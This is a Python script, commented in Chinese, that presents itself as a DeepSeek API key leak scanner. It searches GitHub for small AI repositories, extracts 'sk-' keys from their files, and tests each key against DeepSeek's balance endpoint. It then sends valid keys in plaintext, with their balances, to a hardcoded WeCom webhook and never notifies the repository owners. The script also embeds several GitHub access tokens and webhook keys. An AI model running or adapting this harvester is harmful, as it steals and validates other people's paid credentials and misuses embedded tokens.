#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DeepSeek API Key Leak Scanner — Async 3.1
全异步架构：并行关键词搜索 + 流式仓库扫描 + 智能令牌池
双 Webhook：日志/进度推送 + API Key 泄漏告警
"""

import os
import re
import json
import asyncio
import logging
import sys
import time
from datetime import datetime, timedelta
from urllib.parse import quote
import aiohttp
from aiohttp import ClientTimeout, TCPConnector

# ==========================================
# 配置参数
# ==========================================

DEFAULT_TOKENS = (
    "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,"
    "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,"
    "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,"
    "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,"
    "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"
)

# ---- 双 Webhook 配置 ----
# 日志/进度 Webhook：启动通知、每轮统计、扫描进度、Token 状态等
DEFAULT_LOG_WEBHOOK = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=64eea423-1a95-482b-b5ed-05339da5c819"
# 告警 Webhook：仅推送捕获到的有效 API Key 泄漏
DEFAULT_ALERT_WEBHOOK = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=e0778177-d8de-4f4d-8866-3471f6e7cc67"

GITHUB_TOKENS_ENV = os.getenv("GITHUB_TOKENS", DEFAULT_TOKENS)
GITHUB_TOKENS = [t.strip() for t in GITHUB_TOKENS_ENV.split(",") if t.strip()]
WECOM_LOG_WEBHOOK = os.getenv("WECOM_LOG_WEBHOOK", DEFAULT_LOG_WEBHOOK)
WECOM_ALERT_WEBHOOK = os.getenv("WECOM_ALERT_WEBHOOK", DEFAULT_ALERT_WEBHOOK)

# 并发控制 — 高并发
MAX_SEARCH_CONCURRENT = 10          # 同时进行的搜索请求数
MAX_REPO_SCAN_CONCURRENT = 30       # 同时扫描的仓库数
MAX_FILE_SCAN_CONCURRENT = 50       # 每个仓库内同时扫描的文件数
MAX_KEY_VERIFY_CONCURRENT = 20      # 同时验证的 Key 数
SEARCH_PER_PAGE = 100               # 每页搜索结果数 (GitHub 最大 100)
MAX_SEARCH_PAGES = 5                # 每个关键词最多翻几页

# 进度推送间隔：每扫 N 个仓库或每隔 M 秒推送一次进度
PROGRESS_REPO_INTERVAL = 5          # 每 5 个仓库推送一次进度
PROGRESS_TIME_INTERVAL = 30         # 最长 30 秒推送一次进度

# ==========================================
# 关键词矩阵
# ==========================================

AI_KEYWORDS = [
    "deepseek", "deepseek-ai", "llm-api", "ai-chatbot", "chat-bot",
    "langchain", "llamaindex", "openai-compatible", "agent", "autonomous-agent",
    "gpt-wrapper", "ai-tool", "dify", "one-api", "fastgpt", "auto-gpt",
    "prompt-engineering", "chatgpt-clone", "ai-tutorial", "genai", "rag-demo",
    "sk-deepseek", "DEEPSEEK_API_KEY", "DEEPSEEK_KEY", "deepseek_api",
    "deepseek-chat", "deepseek-coder", "deepseek-v3", "deepseek-r1"
]

# ==========================================
# 基础设施
# ==========================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

DATA_DIR = "/data" if os.path.exists("/data") else "."
SEEN_KEYS_FILE = os.path.join(DATA_DIR, "seen_keys.json")
SEEN_REPOS_FILE = os.path.join(DATA_DIR, "seen_repos.json")

TARGET_EXTS = (
    '.py', '.js', '.json', '.env', '.yml', '.yaml', '.txt', '.ts',
    '.properties', '.ini', '.sh', '.md', '.local', '.toml', '.cfg',
    '.conf', '.xml', '.go', '.rs', '.java', '.kt', '.swift', '.rb',
    '.php', '.c', '.cpp', '.h', '.cs', '.dockerfile', '.makefile'
)

DEEPSEEK_KEY_RE = re.compile(r'(?<![a-zA-Z0-9_-])(sk-[a-zA-Z0-9]{32,48})(?![a-zA-Z0-9_-])')
SKIP_KEY_PATTERNS = re.compile(r'test|example|xxxx|1234|placeholder|your.key|demo|sample', re.IGNORECASE)


# ==========================================
# 智能令牌池
# ==========================================

class TokenPool:
    """管理多个 GitHub Token，自动跟踪剩余配额，按需轮转"""

    def __init__(self, tokens):
        self._pool = {
            t: {"remaining": 5000, "reset_at": 0, "locked_until": 0, "last_used": 0}
            for t in tokens
        }
        self._lock = asyncio.Lock()

    def status_summary(self):
        """返回 Token 池状态摘要"""
        now = time.time()
        parts = []
        for i, s in enumerate(self._pool.values()):
            if now < s["locked_until"]:
                parts.append(f"T{i+1}: 限速中")
            elif s["remaining"] <= 0 and now < s["reset_at"]:
                parts.append(f"T{i+1}: 耗尽")
            else:
                parts.append(f"T{i+1}: {s['remaining']}")
        return " | ".join(parts)

    async def acquire(self):
        """获取一个可用的 token，必要时等待"""
        while True:
            async with self._lock:
                now = time.time()
                for token, state in self._pool.items():
                    if now < state["locked_until"]:
                        continue
                    if state["remaining"] <= 0 and now < state["reset_at"]:
                        continue
                    state["remaining"] -= 1
                    state["last_used"] = now
                    return token, state

            min_wait = min(
                (s["locked_until"] - time.time() if time.time() < s["locked_until"]
                 else s["reset_at"] - time.time() if s["remaining"] <= 0
                 else 0)
                for s in self._pool.values()
            )
            wait = max(min_wait, 0.1)
            logger.debug(f"⏳ 所有 Token 繁忙，等待 {wait:.1f}s ...")
            await asyncio.sleep(wait)

    async def update(self, _token, state, headers):
        """根据响应头更新 token 状态"""
        async with self._lock:
            remaining = headers.get("X-RateLimit-Remaining")
            reset_at = headers.get("X-RateLimit-Reset")
            if remaining is not None:
                state["remaining"] = int(remaining)
            if reset_at is not None:
                state["reset_at"] = int(reset_at)

    async def mark_rate_limited(self, token, state, retry_after=None):
        """标记 token 被限速"""
        async with self._lock:
            wait = int(retry_after) if retry_after else 60
            state["locked_until"] = time.time() + wait
            state["remaining"] = 0
            logger.warning(f"🚫 Token {token[:20]}... 被限速 {wait}s")


# ==========================================
# 异步 HTTP 客户端
# ==========================================

class AsyncGitHubClient:
    """基于 aiohttp 的异步 GitHub API 客户端"""

    def __init__(self, token_pool):
        self.token_pool = token_pool
        self._session = None
        self._sem_search = asyncio.Semaphore(MAX_SEARCH_CONCURRENT)
        self._sem_repo = asyncio.Semaphore(MAX_REPO_SCAN_CONCURRENT)
        self._sem_verify = asyncio.Semaphore(MAX_KEY_VERIFY_CONCURRENT)
        # WeChat webhook 消息队列（避免并发写）
        self._wecom_lock_log = asyncio.Lock()
        self._wecom_lock_alert = asyncio.Lock()

    async def __aenter__(self):
        connector = TCPConnector(
            limit=500,
            limit_per_host=200,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True,
        )
        timeout = ClientTimeout(total=15, connect=5)
        self._session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"Accept-Encoding": "gzip, deflate"},
        )
        return self

    async def __aexit__(self, *args):
        if self._session:
            await self._session.close()

    async def _request(self, url, accept_raw=False):
        """带令牌池和重试的异步请求"""
        for attempt in range(3):
            token, state = await self.token_pool.acquire()
            headers = {
                "Authorization": f"token {token}",
                "Accept": "application/vnd.github.v3.raw" if accept_raw else "application/vnd.github.v3+json",
            }

            try:
                async with self._session.get(url, headers=headers) as resp:
                    await self.token_pool.update(token, state, resp.headers)

                    if resp.status == 200:
                        return await (resp.text() if accept_raw else resp.json())

                    elif resp.status == 401:
                        logger.error(f"❌ Token 失效: {token[:20]}...")
                        await self.token_pool.mark_rate_limited(token, state, 3600)
                        if attempt < 2:
                            continue
                        return None

                    elif resp.status == 403:
                        retry_after = resp.headers.get("Retry-After", "60")
                        await self.token_pool.mark_rate_limited(token, state, retry_after)
                        if attempt < 2:
                            continue
                        return None

                    elif resp.status == 429:
                        retry_after = resp.headers.get("Retry-After", "10")
                        await self.token_pool.mark_rate_limited(token, state, retry_after)
                        if attempt < 2:
                            continue
                        return None

                    elif resp.status == 404:
                        return None

                    else:
                        logger.debug(f"HTTP {resp.status} for {url[:80]}")
                        return None

            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.debug(f"请求异常: {e}")
                if attempt < 2:
                    await asyncio.sleep(0.5)
                    continue
                return None

        return None

    async def search_repos(self, keyword, time_threshold, page=1):
        """异步搜索仓库"""
        query = f"{keyword} stars:<20 pushed:>{time_threshold}"
        url = (
            f"https://api.github.com/search/repositories"
            f"?q={quote(query)}&sort=updated&order=desc&per_page={SEARCH_PER_PAGE}&page={page}"
        )
        async with self._sem_search:
            return await self._request(url)

    async def get_tree(self, owner, repo, branch):
        """获取仓库文件树"""
        url = f"https://api.github.com/repos/{owner}/{repo}/git/trees/{branch}?recursive=1"
        async with self._sem_repo:
            return await self._request(url)

    async def fetch_file(self, owner, repo, branch, path):
        """获取文件原始内容"""
        url = f"https://api.github.com/repos/{owner}/{repo}/contents/{path}?ref={branch}"
        return await self._request(url, accept_raw=True)

    async def verify_key(self, key):
        """验证 DeepSeek API Key"""
        async with self._sem_verify:
            try:
                headers = {"Authorization": f"Bearer {key}"}
                async with self._session.get(
                    "https://api.deepseek.com/user/balance",
                    headers=headers,
                    timeout=ClientTimeout(total=8),
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return True, data.get("balance", "未知")
            except Exception:
                pass
            return False, "无效"

    # ---- 双通道 WeChat 推送 ----

    async def send_log(self, content):
        """推送日志/进度到企业微信 (日志 Webhook)"""
        await self._send_wecom(WECOM_LOG_WEBHOOK, content, self._wecom_lock_log)

    async def send_alert(self, content):
        """推送 API Key 告警到企业微信 (告警 Webhook)"""
        await self._send_wecom(WECOM_ALERT_WEBHOOK, content, self._wecom_lock_alert)

    async def _send_wecom(self, webhook_url, content, lock):
        """内部发送方法"""
        if not webhook_url:
            return
        try:
            msg = {"msgtype": "markdown", "markdown": {"content": content}}
            async with lock:
                async with self._session.post(
                    webhook_url, json=msg,
                    timeout=ClientTimeout(total=5)
                ):
                    pass
        except Exception:
            pass


# ==========================================
# 核心扫描引擎
# ==========================================

class DeepSeekScanner:
    def __init__(self, client):
        self.client = client
        self.seen_keys = self._load_json_set(SEEN_KEYS_FILE)
        self.seen_repos = self._load_json_set(SEEN_REPOS_FILE)
        self.time_threshold = (datetime.utcnow() - timedelta(days=30)).strftime('%Y-%m-%dT%H:%M:%SZ')
        self.stats = {"keys_found": 0, "keys_valid": 0, "repos_scanned": 0, "rounds": 0}

    @staticmethod
    def _load_json_set(path):
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    return set(json.load(f))
            except Exception:
                pass
        return set()

    def _save_json(self, path, data):
        try:
            with open(path, 'w') as f:
                json.dump(list(data), f)
        except Exception as e:
            logger.error(f"保存文件失败 {path}: {e}")

    def _is_target_file(self, path):
        """判断文件是否值得扫描"""
        lower = path.lower()
        if lower.endswith(TARGET_EXTS):
            return True
        if any(kw in lower for kw in ('config', 'env', 'secret', 'credential', 'key', 'token', 'setting')):
            return True
        return False

    async def _scan_repo_files(self, owner, repo, branch, files):
        """并行扫描仓库内所有目标文件"""
        sem = asyncio.Semaphore(MAX_FILE_SCAN_CONCURRENT)

        async def scan_one(filepath):
            async with sem:
                content = await self.client.fetch_file(owner, repo, branch, filepath)
                if content:
                    return filepath, DEEPSEEK_KEY_RE.findall(content)
                return filepath, []

        tasks = [scan_one(f) for f in files]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        all_keys = []
        for result in results:
            if isinstance(result, Exception):
                continue
            filepath, keys = result
            for key in keys:
                if SKIP_KEY_PATTERNS.search(key):
                    continue
                if key in self.seen_keys:
                    continue
                all_keys.append((filepath, key))

        return all_keys

    async def _verify_and_report(self, owner, repo, filepath, key):
        """验证 Key 并发送告警到告警 Webhook"""
        self.seen_keys.add(key)
        self._save_json(SEEN_KEYS_FILE, self.seen_keys)
        self.stats["keys_found"] += 1

        logger.info(f"🎯 捕获疑似 Key: {key[:8]}... 来源: {owner}/{repo}/{filepath}")

        valid, balance = await self.client.verify_key(key)
        if valid:
            self.stats["keys_valid"] += 1
            logger.warning(f"✅ 有效 Key! {key[:8]}...{key[-4:]} 余额: {balance}")
            # 有效 Key 推送到告警 Webhook
            await self.client.send_alert(
                f"🚨 **DeepSeek Key 泄漏**\n"
                f"> **状态**: ✅ 有效 (余额: {balance})\n"
                f"> **仓库**: [{owner}/{repo}](https://github.com/{owner}/{repo})\n"
                f"> **文件**: `{filepath}`\n"
                f"> **凭证**: `{key}`"
            )
        return valid

    async def process_repo(self, repo):
        """处理单个仓库，返回 (repo_fullname, found_keys_count) 供进度上报"""
        repo_id = repo["id"]
        if repo_id in self.seen_repos:
            return None

        self.seen_repos.add(repo_id)
        self.stats["repos_scanned"] += 1

        owner = repo["owner"]["login"]
        name = repo["name"]
        branch = repo.get("default_branch", "main")
        full_name = f"{owner}/{name}"

        # 获取文件树
        tree_data = await self.client.get_tree(owner, name, branch)
        if not tree_data or "tree" not in tree_data:
            return (full_name, 0)

        # 筛选目标文件，最多 150 个
        target_files = [
            it["path"] for it in tree_data["tree"]
            if it.get("type") == "blob" and self._is_target_file(it["path"])
        ][:150]

        if not target_files:
            return (full_name, 0)

        # 并行扫描所有文件
        found = await self._scan_repo_files(owner, name, branch, target_files)
        if not found:
            return (full_name, 0)

        # 并行验证所有 Key
        verify_tasks = [
            self._verify_and_report(owner, name, fp, key)
            for fp, key in found
        ]
        await asyncio.gather(*verify_tasks, return_exceptions=True)

        return (full_name, len(found))

    async def _search_keyword_pages(self, keyword):
        """搜索一个关键词的所有分页"""
        all_repos = []
        for page in range(1, MAX_SEARCH_PAGES + 1):
            data = await self.client.search_repos(keyword, self.time_threshold, page)
            if data and "items" in data and data["items"]:
                new_repos = [r for r in data["items"] if r["id"] not in self.seen_repos]
                all_repos.extend(new_repos)
                if len(data["items"]) < SEARCH_PER_PAGE:
                    break
            else:
                break
        return keyword, all_repos

    async def run_once(self):
        """一轮完整扫描：所有关键词并行搜索 -> 流式处理仓库（带进度推送）"""
        self.stats["rounds"] += 1
        round_num = self.stats["rounds"]
        round_start = time.time()

        logger.info(f"═══ 第 {round_num} 轮扫描开始 ═══")

        # 阶段 1: 所有关键词并行搜索
        search_tasks = [
            self._search_keyword_pages(kw)
            for kw in AI_KEYWORDS
        ]
        search_results = await asyncio.gather(*search_tasks, return_exceptions=True)

        # 汇总所有仓库（去重）
        all_repos = {}
        for result in search_results:
            if isinstance(result, Exception):
                logger.error(f"搜索异常: {result}")
                continue
            _, repos = result
            for r in repos:
                all_repos[r["id"]] = r

        new_repos = list(all_repos.values())
        total_repos = len(new_repos)
        logger.info(f"📂 第 {round_num} 轮: 发现 {total_repos} 个新仓库，开始极速扫描...")

        # ---- 推送到日志 Webhook: 轮次开始 ----
        ts = datetime.now().strftime('%H:%M:%S')
        await self.client.send_log(
            f"🔍 **第 {round_num} 轮扫描开始** [{ts}]\n"
            f"> 发现新仓库: **{total_repos}** 个\n"
            f"> Token 状态: {self.client.token_pool.status_summary()}"
        )

        # 阶段 2: 并行处理所有仓库（信号量控制并发），并实时上报进度
        if not new_repos:
            self._save_json(SEEN_REPOS_FILE, self.seen_repos)
            elapsed = time.time() - round_start
            logger.info(f"✅ 第 {round_num} 轮: 无新仓库 | 耗时 {elapsed:.1f}s")
            return

        sem = asyncio.Semaphore(MAX_REPO_SCAN_CONCURRENT)

        # 进度追踪
        completed = 0
        progress_lock = asyncio.Lock()
        last_push_time = time.time()
        recent_repos = []  # 最近完成的一批仓库名

        async def process_with_limit(repo):
            nonlocal completed, last_push_time
            result = None
            async with sem:
                try:
                    result = await self.process_repo(repo)
                except Exception as e:
                    logger.error(f"仓库处理异常: {e}")
                    result = (f"{repo.get('owner',{}).get('login','?')}/{repo.get('name','?')}", 0)

            # 更新进度
            async with progress_lock:
                completed += 1
                if result:
                    recent_repos.append(result[0])
                now = time.time()
                # 每 N 个仓库或每 M 秒推送一次进度
                if (completed % PROGRESS_REPO_INTERVAL == 0) or \
                   (now - last_push_time >= PROGRESS_TIME_INTERVAL) or \
                   (completed == total_repos):
                    await self._push_progress(round_num, completed, total_repos, recent_repos, last_push_time, now)
                    recent_repos.clear()
                    last_push_time = now

        # 发射所有仓库扫描任务
        await asyncio.gather(*[process_with_limit(r) for r in new_repos])

        # 持久化
        self._save_json(SEEN_REPOS_FILE, self.seen_repos)

        elapsed = time.time() - round_start
        logger.info(
            f"✅ 第 {round_num} 轮完成 | "
            f"累计 Key: {self.stats['keys_found']} | "
            f"有效: {self.stats['keys_valid']} | "
            f"已扫仓库: {len(self.seen_repos)} | "
            f"耗时: {elapsed:.1f}s"
        )

        # ---- 推送到日志 Webhook: 轮次结束 ----
        ts_end = datetime.now().strftime('%H:%M:%S')
        await self.client.send_log(
            f"✅ **第 {round_num} 轮扫描完成** [{ts_end}]\n"
            f"> 扫描仓库: {total_repos} 个\n"
            f"> 耗时: {elapsed:.0f}s\n"
            f"> 累计发现 Key: **{self.stats['keys_found']}**\n"
            f"> 有效 Key: **{self.stats['keys_valid']}**\n"
            f"> 累计已扫仓库: {len(self.seen_repos)}\n"
            f"> Token 状态: {self.client.token_pool.status_summary()}"
        )

    async def _push_progress(self, round_num, completed, total, repo_names, last_push_time, now):
        """推送扫描进度到日志 Webhook"""
        pct = completed * 100 // total if total > 0 else 0
        interval = now - last_push_time

        # 取最近完成的仓库名（截断显示）
        name_list = "、".join(f"`{n}`" for n in repo_names[-5:])  # 最多展示最近 5 个
        if not name_list:
            name_list = "—"

        await self.client.send_log(
            f"📊 **扫描进度** [{round_num}轮]\n"
            f"> 进度: **{completed}/{total}** ({pct}%) | 距上次: {interval:.0f}s\n"
            f"> 最近完成: {name_list}"
        )


# ==========================================
# 主循环
# ==========================================

async def main():
    token_pool = TokenPool(GITHUB_TOKENS)
    logger.info(f"🚀 DeepSeek 全网盲扫机 3.1 启动 | Tokens: {len(GITHUB_TOKENS)} | 关键词: {len(AI_KEYWORDS)}")
    logger.info(f"📡 日志 Webhook: {'已配置' if WECOM_LOG_WEBHOOK else '未配置'}")
    logger.info(f"🚨 告警 Webhook: {'已配置' if WECOM_ALERT_WEBHOOK else '未配置'}")

    async with AsyncGitHubClient(token_pool) as client:
        scanner = DeepSeekScanner(client)

        # ---- 启动通知 -> 日志 Webhook ----
        ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        await client.send_log(
            f"🔥 **DeepSeek 全网盲扫机 3.1 启动**\n"
            f"> 启动时间: {ts}\n"
            f"> GitHub Tokens: **{len(GITHUB_TOKENS)}** 个\n"
            f"> 关键词矩阵: **{len(AI_KEYWORDS)}** 个\n"
            f"> 架构: asyncio + aiohttp 全异步\n"
            f"> 搜索范围: 低星(<20) + 最近30天更新\n"
            f"> 日志推送: ✅ 已就绪\n"
            f"> 告警推送: ✅ 已就绪"
        )

        while True:
            try:
                await scanner.run_once()
            except Exception as e:
                logger.error(f"轮次异常: {e}", exc_info=True)
                await client.send_log(
                    f"⚠️ **扫描异常**\n> 轮次: {scanner.stats['rounds']}\n> 错误: `{str(e)[:200]}`"
                )
                await asyncio.sleep(5)

            # 几乎无间隔
            await asyncio.sleep(0.1)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("🛑 扫描机已停止")
